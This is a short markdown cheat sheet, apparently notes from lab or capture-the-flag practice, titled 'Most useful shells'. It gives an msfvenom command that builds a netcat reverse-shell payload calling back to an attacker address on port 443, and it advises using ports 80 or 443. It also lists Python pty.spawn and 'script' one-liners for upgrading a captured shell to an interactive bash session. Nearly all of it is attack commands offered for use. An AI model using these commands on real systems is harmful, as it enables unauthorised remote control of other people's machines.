# Most useful shells

* Try always using ports: 80 or 443 if open

## Linux

`msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.xxx.xxx LPORT=443 -f python`

# Shell Upgrade

* The bind/reverse shell is not always fully interactive
* Python trick can be used to make it such

<code> python -c 'import pty; pty.spawn("/bin/bash")' </code><br>
<code> python3 -c 'import pty;pty.spawn("/bin/bash")' </code>

* Using script
'script /dev/null -c bash'
